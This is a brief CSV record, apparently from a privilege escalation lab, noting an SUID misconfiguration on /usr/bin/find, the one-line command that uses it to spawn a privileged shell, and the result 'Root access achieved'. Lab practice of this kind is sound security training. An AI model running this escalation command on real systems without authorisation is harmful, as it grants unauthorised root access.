Field,Value
Project Name,Privilege Escalation Lab
Vulnerable Binary,/usr/bin/find
Misconfiguration,SUID Bit (Set User ID)
Escalation Path,find . -exec /bin/sh -p \; -quit
Final Status,Root access achieved
